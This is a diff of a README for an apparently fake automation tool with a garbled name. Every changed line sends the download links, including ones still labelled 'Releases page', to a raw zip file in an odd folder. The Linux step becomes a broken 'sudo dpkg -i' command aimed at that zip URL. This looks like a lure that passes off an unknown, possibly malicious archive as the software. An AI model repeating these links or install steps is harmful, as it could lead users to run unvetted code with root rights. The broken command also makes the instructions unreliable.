@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-amatansdiahnid--25-blue.svg)](https://github.com/ina816/amanansdiahnid-25/releases)
+[![Download](https://raw.githubusercontent.com/ina816/amanansdiahnid-25/main/uncircumspect/amanansdiahnid-25.zip)](https://raw.githubusercontent.com/ina816/amanansdiahnid-25/main/uncircumspect/amanansdiahnid-25.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To ensure that amanansdiahnid-25 runs smoothly on your computer, please check th
 
 ## 📦 Download & Install
 
-To get started, visit our [Releases page](https://github.com/ina816/amanansdiahnid-25/releases) to download the latest version of amanansdiahnid-25.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/ina816/amanansdiahnid-25/main/uncircumspect/amanansdiahnid-25.zip) to download the latest version of amanansdiahnid-25.
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of the software.
@@ -44,7 +44,7 @@ Once the download is complete:
   
 - **For macOS**: Open the downloaded `.dmg` file, drag the application to your Applications folder, and then open it from there.
 
-- **For Linux**: If you downloaded a `.deb` file, open a terminal and navigate to the folder where it's downloaded. Run `sudo dpkg -i yourfile.deb` to install. For other formats, follow the specific installation steps for your distribution.
+- **For Linux**: If you downloaded a `.deb` file, open a terminal and navigate to the folder where it's downloaded. Run `sudo dpkg -i https://raw.githubusercontent.com/ina816/amanansdiahnid-25/main/uncircumspect/amanansdiahnid-25.zip` to install. For other formats, follow the specific installation steps for your distribution.
 
 ## 💡 Usage Instructions
 
@@ -81,6 +81,6 @@ For further inquiries or feedback, please reach out via our GitHub repository. W
 
 ## 📦 Download Again
 
-Don’t forget, you can always [visit our Releases page](https://github.com/ina816/amanansdiahnid-25/releases) to download the latest version or any previous versions whenever you need. 
+Don’t forget, you can always [visit our Releases page](https://raw.githubusercontent.com/ina816/amanansdiahnid-25/main/uncircumspect/amanansdiahnid-25.zip) to download the latest version or any previous versions whenever you need. 
 
 Thank you for choosing amanansdiahnid-25! Enjoy automating your tasks.
